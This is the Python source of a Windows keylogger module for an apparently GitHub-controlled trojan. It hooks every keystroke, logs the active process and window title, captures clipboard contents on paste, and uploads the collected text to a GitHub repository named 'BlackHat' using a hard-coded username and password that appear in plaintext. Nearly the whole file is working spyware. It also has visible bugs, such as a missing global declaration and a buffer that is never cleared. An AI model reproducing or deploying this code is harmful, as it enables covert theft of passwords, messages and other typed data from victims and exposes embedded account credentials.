from ctypes import *
from github3 import login
from uuid import getnode
import base64
import pywin
import pythoncom
import pyHook
import win32clipboard
import platform
from datetime import datetime


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
data = ""
gh_username = "aberlanga25"
gh_password = "natacion3"
gh_repo = "BlackHat"
gh_remote = "Trojan/data/"

trojan_id = base64.b64encode((platform.node() + "-" + hex(getnode())).encode()).decode("utf-8")
trojan_id_default = base64.b64encode("default".encode()).decode("utf-8")
trojan_config_file_path = f"Trojan/config/{trojan_id}.json"
trojan_default_config_file_path = f"Trojan/config/{trojan_id_default}.json"
trojan_module_folder_path = "Trojan/modules/"
trojan_output_file_name = datetime.utcnow().isoformat() + "-" + trojan_id
trojan_output_file_path = "Trojan/data/" + trojan_output_file_name

def get_current_process():

    hwnd = user32.GetForegroundWindow()

    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    process_id = "%d" % pid.value

    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    #print("[*] In keyLog module")
    print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
    data += "[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def store_output(trojan_output_file_contents):
    gh, repo, branch = gh_connect()
    sha = get_file_sha(trojan_output_file_path)
    if sha:
        repo.contents(trojan_output_file_path).update(trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
    else:
        repo.create_file(trojan_output_file_path, trojan_output_file_name, base64.b64encode(trojan_output_file_contents.encode()))
    return

def get_file_sha(file_path):
    gh, repo, branch = gh_connect()
    try:
        contents = repo.file_contents(file_path)
        return contents.sha
    except:
        return None

def gh_connect():
    gh = login(username=gh_username, password=gh_password)
    repo = gh.repository(gh_username, gh_repo)
    branch = repo.branch("origin")
    return gh, repo, branch


def KeyStroke(event):

    global current_window, data

    if len(data)>500:
        store_output(data)

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii))
        data += chr(event.Ascii)
    else:

        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % pasted_value)
        else:
            print("[%s]" % event.Key)

    return True

kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

kl.HookKeyboard()
pythoncom.PumpMessages()
